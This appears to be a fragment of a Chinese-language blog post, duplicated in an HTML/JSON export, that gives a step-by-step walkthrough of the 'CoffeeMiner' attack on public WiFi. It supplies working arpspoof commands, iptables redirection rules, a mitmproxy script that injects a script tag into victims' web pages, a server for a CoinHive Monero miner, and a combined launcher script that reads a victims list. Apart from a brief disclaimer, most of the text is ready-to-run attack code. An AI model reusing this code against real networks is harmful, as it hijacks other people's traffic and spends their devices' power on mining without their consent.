plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">网络0设置dhcp自动获取.</span><br><span class=\"line\">网络1:</span><br><span class=\"line\">ip地址 : 10.0.2.15</span><br><span class=\"line\">子网掩码 : 255.255.255.0</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"1-CoffeeMiner的攻击代码\"><a href=\"#1-CoffeeMiner的攻击代码\" class=\"headerlink\" title=\"1.CoffeeMiner的攻击代码\"></a>1.CoffeeMiner的攻击代码</h2><h3 id=\"1-1-ARP欺骗\"><a href=\"#1-1-ARP欺骗\" class=\"headerlink\" title=\"1.1 ARP欺骗\"></a>1.1 ARP欺骗</h3><p>中间人攻击是一种由来已久的网络入侵手段，并且在今天仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击.<br>简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情.</p>\n<p>随着计算机通信网技术的不断发展，MITM攻击也越来越多样化.<br>最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等.后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行.</p>\n<p>如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的.</p>\n<p>所以要执行ARP欺骗攻击，我就将使用dsniff库.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arpspoof -i interface -t ipVictim ipGateway</span><br><span class=\"line\">arpspoof -i interface -t ipGateway ipVictim</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-2-mitmproxy\"><a href=\"#1-2-mitmproxy\" class=\"headerlink\" title=\"1.2 mitmproxy\"></a>1.2 mitmproxy</h2><p>需要在html页面注入代码,可以使用mitmproxy分析主机的流量，并对该流量做手脚.在这个案例中，攻击者将使用它将javascript注入html页面.<br>为了使这个虚拟过程简单易操作，这里在html页面中只注入一行代码，然后调用JavaScript挖矿的HTML代码行.<br>注入挖矿代码的流程如下所示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;http://httpserverIP:8080/script.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"1-3-注入器\"><a href=\"#1-3-注入器\" class=\"headerlink\" title=\"1.3 注入器\"></a>1.3 注入器</h2><p>一旦拦截了受害者的流量，就需要注入攻击者的挖矿脚本.使用mitmproxy API来完成注入.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"><span class=\"keyword\">from</span> mitmproxy <span class=\"keyword\">import</span> ctx, http</span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Injector</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, path)</span>:</span></span><br><span class=\"line\">        self.path = path</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">response</span><span class=\"params\">(self, flow: http.HTTPFlow)</span> -&gt; <span class=\"keyword\">None</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.path:</span><br><span class=\"line\">            html = BeautifulSoup(flow.response.content, <span class=\"string\">\"html.parser\"</span>)</span><br><span class=\"line\">            print(self.path)</span><br><span class=\"line\">            print(flow.response.headers[<span class=\"string\">\"content-type\"</span>])</span><br><span class=\"line\">            <span class=\"keyword\">if</span> flow.response.headers[<span class=\"string\">\"content-type\"</span>] == <span class=\"string\">'text/html'</span>:</span><br><span class=\"line\">                script = html.new_tag(</span><br><span class=\"line\">                    <span class=\"string\">\"script\"</span>,</span><br><span class=\"line\">                    src=self.path,</span><br><span class=\"line\">                    type=<span class=\"string\">'application/javascript'</span>)</span><br><span class=\"line\">                html.body.insert(<span class=\"number\">0</span>, script)</span><br><span class=\"line\">                flow.response.content = str(html).encode(<span class=\"string\">\"utf8\"</span>)</span><br><span class=\"line\">                print(<span class=\"string\">\"Script injected.\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">start</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = argparse.ArgumentParser()</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">\"path\"</span>, type=str)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Injector(args.path)</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-4-HTTP服务器\"><a href=\"#1-4-HTTP服务器\" class=\"headerlink\" title=\"1.4 HTTP服务器\"></a>1.4 HTTP服务器</h3><p>正如以上你看到的，向注入器添加了一行指向HTML的代码，以调用JavaScript挖矿.所以，还需要在HTTP服务器中部署脚本文件.</p>\n<p>为了实现javascript 加密挖矿，攻击者要在设备中部署一个HTTP服务器.这里使用Python库“http.server”：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> http.server</span><br><span class=\"line\"><span class=\"keyword\">import</span> socketserver</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">PORT = <span class=\"number\">8000</span></span><br><span class=\"line\">web_dir = os.path.join(os.path.dirname(__file__), <span class=\"string\">'miner_script'</span>)</span><br><span class=\"line\">os.chdir(web_dir)</span><br><span class=\"line\">Handler = http.server.SimpleHTTPRequestHandler</span><br><span class=\"line\">httpd = socketserver.TCPServer((<span class=\"string\">\"\"</span>, PORT), Handler)</span><br><span class=\"line\">print(<span class=\"string\">\"serving at port\"</span>, PORT)</span><br><span class=\"line\">httpd.serve_forever()</span><br></pre></td></tr></table></figure></p>\n<p>上面的代码就是一个简单的HTTP服务器，它将在需要时执行攻击者设置的挖矿服务.<br>JavaScript挖矿将被放置在/miner_script目录中.在这个案例中，使用了CoinHive JavaScript挖矿工具.</p>\n<p>*Coinhive是一个提供恶意JS脚本的网站平台（<a href=\"https://coin-hive[.]com），允许攻击者将脚本挂在到自己的或入侵的网站上，所有访问该网站的用户都可能成为门罗币的挖掘矿工.Coinhive工具其实是一个JavaScript库，用户访问加载该JS的网站后，Coinhive的JS代码库在用户的浏览器上运行，开始为网站所有者挖掘门罗币，消耗的是用户自己的CPU资源。它可以被添加进一个网站，并将使用用户的CPU功率来计算哈希与Cryptonight\" target=\"_blank\" rel=\"noopener\">https://coin-hive[.]com），允许攻击者将脚本挂在到自己的或入侵的网站上，所有访问该网站的用户都可能成为门罗币的挖掘矿工.Coinhive工具其实是一个JavaScript库，用户访问加载该JS的网站后，Coinhive的JS代码库在用户的浏览器上运行，开始为网站所有者挖掘门罗币，消耗的是用户自己的CPU资源。它可以被添加进一个网站，并将使用用户的CPU功率来计算哈希与Cryptonight</a> PoW哈希算法来挖掘基于CryptoNote协议的门罗币.不过CoinHive的执行要在网站的运行时间超过四十秒时才会有效，如果用户意识到自己打开了一个有问题的页面，立马关闭，则CoinHive就会运行失败.</p>\n<h2 id=\"2-CoffeeMiner的运行\"><a href=\"#2-CoffeeMiner的运行\" class=\"headerlink\" title=\"2.CoffeeMiner的运行\"></a>2.CoffeeMiner的运行</h2><p>在以上这些条件准备好以后，开始执行CoffeeMiner，进而让CoffeeMiner脚本执行ARPspoofing攻击，并用mitmproxy将CoinHive cryptominer注入受害者的HTML页面。<br>为此，需要首先配置ip_forwarding和IPTABLES，以便将攻击者的设备转换为代理。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class=\"line\">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class=\"line\">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</span><br></pre></td></tr></table></figure>\n<p>为了对所有受害者执行ARP欺骗，我将为受害者的所有IP准备一个“victim.txt”文件。不过要读取所有受害者IP，就准备一些Python行，它将获得IP（以及命令行参数中的网关IP），并对每个受害者的IP执行ARP欺骗。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gateway = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">print(<span class=\"string\">\"gateway: \"</span> + gateway)</span><br><span class=\"line\"><span class=\"comment\"># get victims_ip</span></span><br><span class=\"line\">victims = [line.rstrip(<span class=\"string\">'n'</span>) <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> open(<span class=\"string\">\"victims.txt\"</span>)]</span><br><span class=\"line\">print(<span class=\"string\">\"victims:\"</span>)</span><br><span class=\"line\">print(victims)</span><br><span class=\"line\"><span class=\"comment\"># run the arpspoof for each victim, each one in a new console</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> victim <span class=\"keyword\">in</span> victims:</span><br><span class=\"line\">    os.system(<span class=\"string\">\"xterm -e arpspoof -i eth0 -t \"</span> + victim + <span class=\"string\">\" \"</span> + gateway + <span class=\"string\">\" &amp;\"</span>)</span><br><span class=\"line\">    os.system(<span class=\"string\">\"xterm -e arpspoof -i eth0 -t \"</span> + gateway + <span class=\"string\">\" \"</span> + victim + <span class=\"string\">\" &amp;\"</span>)</span><br></pre></td></tr></table></figure></p>\n<p>一旦执行了ARP欺骗，只需要运行HTTP服务器即可.<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; python3 httpServer.py</span><br></pre></td></tr></table></figure></p>\n<p>现在，可以用injector.py运行mitmproxy了.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; mitmdump -s <span class=\"string\">'injector.py http://httpserverIP:8080/script.js'</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"3-CoffeeMiner的最终挖矿脚本\"><a href=\"#3-CoffeeMiner的最终挖矿脚本\" class=\"headerlink\" title=\"3.CoffeeMiner的最终挖矿脚本\"></a>3.CoffeeMiner的最终挖矿脚本</h2><p>现在把上面解释的所有概念都放在’coffeeMiner.py’脚本中：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"comment\">#get gateway_ip (router)</span></span><br><span class=\"line\">gateway = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">print(<span class=\"string\">\"gateway: \"</span> + gateway)</span><br><span class=\"line\"><span class=\"comment\"># get victims_ip</span></span><br><span class=\"line\">victims = [line.rstrip(<span class=\"string\">'n'</span>) <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> open(<span class=\"string\">\"victims.txt\"</span>)]</span><br><span class=\"line\">print(<span class=\"string\">\"victims:\"</span>)</span><br><span class=\"line\">print(victims)</span><br><span class=\"line\"><span class=\"comment\"># configure routing (IPTABLES)</span></span><br><span class=\"line\">os.system(<span class=\"string\">\"echo 1 &gt; /proc/sys/net/ipv4/ip_forward\"</span>)</span><br><span class=\"line\">os.system(<span class=\"string\">\"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\"</span>)</span><br><span class=\"line\">os.system(<span class=\"string\">\"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\"</span>)</span><br><span class=\"line\">os.system(<span class=\"string\">\"iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># run the arpspoof for each victim, each one in a new console</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> victim <span class=\"keyword\">in</span> victims:</span><br><span class=\"line\">    os.system(<span class=\"string\">\"xterm -e arpspoof -i eth0 -t \"</span> + victim + <span class=\"string\">\" \"</span> + gateway + <span class=\"string\">\" &amp;\"</span>)</span><br><span class=\"line\">    os.system(<span class=\"string\">\"xterm -e arpspoof -i eth0 -t \"</span> + gateway + <span class=\"string\">\" \"</span> + victim + <span class=\"string\">\" &amp;\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># start the http server for serving the script.js, in a new console</span></span><br><span class=\"line\">os.system(<span class=\"string\">\"xterm -hold -e 'python3 httpServer.py' &amp;\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># start the mitmproxy</span></span><br><span class=\"line\">os.system(<span class=\"string\">\"~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T\"</span>)</span><br></pre></td></tr></table></figure></p>\n<p>在’injector.py’脚本中：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"><span class=\"keyword\">from</span> mitmproxy <span class=\"keyword\">import</span> ctx, http</span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Injector</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, path)</span>:</span></span><br><span class=\"line\">        self.path = path</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">response</span><span class=\"params\">(self, flow: http.HTTPFlow)</span> -&gt; <span class=\"keyword\">None</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.path:</span><br><span class=\"line\">            html = BeautifulSoup(flow.response.content, <span class=\"string\">\"html.parser\"</span>)</span><br><span class=\"line\">            print(self.path)</span><br><span class=\"line\">            print(flow.response.headers[<span class=\"string\">\"content-type\"</span>])</span><br><span class=\"line\">            <span class=\"keyword\">if</span> flow.response.headers[<span class=\"string\">\"content-type\"</span>] == <span class=\"string\">'text/html'</span>:</span><br><span class=\"line\">                print(flow.response.headers[<span class=\"string\">\"content-type\"</span>])</span><br><span class=\"line\">                script = html.new_tag(</span><br><span class=\"line\">                    <span class=\"string\">\"script\"</span>,</span><br><span class=\"line\">                    src=self.path,</span><br><span class=\"line\">                    type=<span class=\"string\">'application/javascript'</span>)</span><br><span class=\"line\">                html.body.insert(<span class=\"number\">0</span>, script)</span><br><span class=\"line\">                flow.response.content = str(html).encode(<span class=\"string\">\"utf8\"</span>)</span><br><span class=\"line\">                print(<span class=\"string\">\"Script injected.\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">start</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = argparse.ArgumentParser()</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">\"path\"</span>, type=str)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Injector(args.path)</span><br></pre></td></tr></table></figure></p>\n<p>要执行挖矿，只需要执行以下操作：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; python3 coffeeMiner.py RouterIP</span><br></pre></td></tr></table></figure></p>\n<p>当然也可以手动运行.</p>\n<p><img src=\"/images/coffeeMiner-demo-cutted.gif\" alt=\"\"></p>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><p>正如我们所看到的，攻击者可以轻松执行，也可以部署为WiFi网络中的自主攻击.</p>\n<p>另一个想到的是，对于真实世界的WiFi网络来说，使用强大的WiFi天线执行攻击过程，以扩大攻击范围.</p>\n<p>虽然攻击者主要目标是执行自主攻击，但我们仍然需要使用受害设备的IP地址编辑victim.txt文件. 对于更多版本，可能的功能可能是添加自主的Nmap扫描，将检测到的IP添加到CoffeeMiner受害者列表中. 另一个功能，可能是添加sslstrip，以确保注入也在用户可以通过HTTPS请求的网站中.</p>\n<p>附:完整的攻击代码：https：//github.com/arnaucode/coffeeMiner</p>\n","site":{"data":{}},"excerpt":"","more":"<p>##警告:本篇文章和文章内提及的项目仅限于学术研究.</p>\n<p>这篇文章的目的是解释如何做MITM（Man（Person） In The Middle）的攻击，在html页面注入javascript，强制连接到WiFi网络的所有设备都为攻击者挖掘门罗币.</p>\n<p>攻击者有一个脚本可以执行对WiFi网络的自主攻击，我将其称为CoffeeMiner，因为这是一种可以在咖啡馆WiFi网络中执行的攻击. 这种攻击就是将一些设备连接到WiFi网络，并且CoffeeMiner攻击者会在连接过程中拦截用户和路由器之间的流量.</p>\n<p><img src=\"/images/coffeeMiner-network-attack.png\" alt=\"\"></p>\n<p>正常WIFI网络配置:</p>\n<p>Victim:连接到路由器并浏览页面的机器<br>Attacker:运行CoffeeMiner的机器,将执行MITM.<br>gateway/router:正常的路由器</p>\n<p><img src=\"/images/scenario01.png\" alt=\"\"></p>\n<p>一旦执行攻击,情况将是:</p>\n<p><img src=\"/images/scenario02.png\" alt=\"\"></p>\n<p>攻击者要配置每台机器将执行以下配置：</p>\n<p>Victim:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip地址 : 10.0.2.10</span><br><span class=\"line\">子网掩码 : 255.255.255.0</span><br><span class=\"line\">默认网关:10.0.0.15</span><br></pre></td></tr></table></figure></p>\n<p>Attacker:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip地址 : 10.0.2.20</span><br><span class=\"line\">子网掩码 : 255.255.255.0</span><br><span class=\"line\">默认网关:10.0.0.15</span><br></pre></td></tr></table></figure></p>\n<p>gateway/router:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">网络0设置dhcp自动获取.</span><br><span class=\"line\">网络1:</span><br><span class=\"line\">ip地址 : 10.0.2.15</span><br><span class=\"line\">子网掩码 : 255.255.255.0</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"1-CoffeeMiner的攻击代码\"><a href=\"#1-CoffeeMiner的攻击代码\" class=\"headerlink\" title=\"1.CoffeeMiner的攻击代码\"></a>1.CoffeeMiner的攻击代码</h2><h3 id=\"1-1-ARP欺骗\"><a href=\"#1-1-ARP欺骗\" class=\"headerlink\" title=\"1.1 ARP欺骗\"></a>1.1 ARP欺骗</h3><p>中间人攻击是一种由来已久的网络入侵手段，并且在今天仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击.<br>简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情.</p>\n<p>随着计算机通信网技术的不断发展，MITM攻击也越来越多样化.<br>最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等.后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行.</p>\n<p>如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的.</p>\n<p>所以要执行ARP欺骗攻击，我就将使用dsniff库.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arpspoof -i interface -t ipVictim ipGateway</span><br><span class=\"line\">arpspoof -i interface -t ipGateway ipVictim</span><br></pre></td></tr></table></figure>\n<h2 id=\"1-2-mitmproxy\"><a href=\"#1-2-mitmproxy\" class=\"headerlink\" title=\"1.2 mitmproxy\"></a>1.2 mitmproxy</h2><p>需要在html页面注入代码,可以使用mitmproxy分析主机的流量，并对该流量做手脚.在这个案例中，攻击者将使用它将javascript注入html页面.<br>为了使这个虚拟过程简单易操作，这里在html页面中只注入一行代码，然后调用JavaScript挖矿的HTML代码行.<br>注入挖矿代码的流程如下所示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;http://httpserverIP:8080/script.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"1-3-注入器\"><a href=\"#1-3-注入器\" class=\"headerlink\" title=\"1.3 注入器\"></a>1.3 注入器</h2><p>一旦拦截了受害者的流量，就需要注入攻击者的挖矿脚本.使用mitmproxy API来完成注入.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"><span class=\"keyword\">from</span> mitmproxy <span class=\"keyword\">import</span> ctx, http</span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Injector</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, path)</span>:</span></span><br><span class=\"line\">        self.path = path</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">response</span><span class=\"params\">(self, flow: http.HTTPFlow)</span> -&gt; <span class=\"keyword\">None</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.path:</span><br><span class=\"line\">            html = BeautifulSoup(flow.response.content, <span class=\"string\">\"html.parser\"</span>)</span><br><span class=\"line\">            print(self.path)</span><br><span class=\"line\">            print(flow.response.headers[<span class=\"string\">\"content-type\"</span>])</span><br><span class=\"line\">            <span class=\"keyword\">if</span> flow.response.headers[<span class=\"string\">\"content-type\"</span>] == <span class=\"string\">'text/html'</span>:</span><br><span class=\"line\">                script = html.new_tag(</span><br><span class=\"line\">                    <span class=\"string\">\"script\"</span>,</span><br><span class=\"line\">                    src=self.path,</span><br><span class=\"line\">                    type=<span class=\"string\">'application/javascript'</span>)</span><br><span class=\"line\">                html.body.insert(<span class=\"number\">0</span>, script)</span><br><span class=\"line\">                flow.response.content = str(html).encode(<span class=\"string\">\"utf8\"</span>)</span><br><span class=\"line\">                print(<span class=\"string\">\"Script injected.\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">start</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = argparse.ArgumentParser()</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">\"path\"</span>, type=str)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Injector(args.path)</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-4-HTTP服务器\"><a href=\"#1-4-HTTP服务器\" class=\"headerlink\" title=\"1.4 HTTP服务器\"></a>1.4 HTTP服务器</h3><p>正如以上你看到的，向注入器添加了一行指向HTML的代码，以调用JavaScript挖矿.所以，还需要在HTTP服务器中部署脚本文件.</p>\n<p>为了实现javascript 加密挖矿，攻击者要在设备中部署一个HTTP服务器.这里使用Python库“http.server”：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> http.server</span><br><span class=\"line\"><span class=\"keyword\">import</span> socketserver</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">PORT = <span class=\"number\">8000</span></span><br><span class=\"line\">web_dir = os.path.join(os.path.dirname(__file__), <span class=\"string\">'miner_script'</span>)</span><br><span class=\"line\">os.chdir(web_dir)</span><br><span class=\"line\">Handler = http.server.SimpleHTTPRequestHandler</span><br><span class=\"line\">httpd = socketserver.TCPServer((<span class=\"string\">\"\"</span>, PORT), Handler)</span><br><span class=\"line\">print(<span class=\"string\">\"serving at port\"</span>, PORT)</span><br><span class=\"line\">httpd.serve_forever()</span><br></pre></td></tr></table></figure></p>\n<p>上面的代码就是一个简单的HTTP服务器，它将在需要时执行攻击者设置的挖矿服务.<br>JavaScript挖矿将被放置在/miner_script目录中.在这个案例中，使用了CoinHive JavaScript挖矿工具.</p>\n<p>*Coinhive是一个提供恶意JS脚本的网站平台（<a href=\"https://coin-hive[.]com），允许攻击者将脚本挂在到自己的或入侵的网站上，所有访问该网站的用户都可能成为门罗币的挖掘矿工.Coinhive工具其实是一个JavaScript库，用户访问加载该JS的网站后，Coinhive的JS代码库在用户的浏览器上运行，开始为网站所有者挖掘门罗币，消耗的是用户自己的CPU资源。它可以被添加进一个网站，并将使用用户的CPU功率来计算哈希与Cryptonight\" target=\"_blank\" rel=\"noopener\">https://coin-hive[.]com），允许攻击者将脚本挂在到自己的或入侵的网站上，所有访问该网站的用户都可能成为门罗币的挖掘矿工.Coinhive工具其实是一个JavaScript库，用户访问加载该JS的网站后，Coinhive的JS代码库在用户的浏览器上运行，开始为网站所有者挖掘门罗币，消耗的是用户自己的CPU资源。它可以被添加进一个网站，并将使用用户的CPU功率来计算哈希与Cryptonight</a> 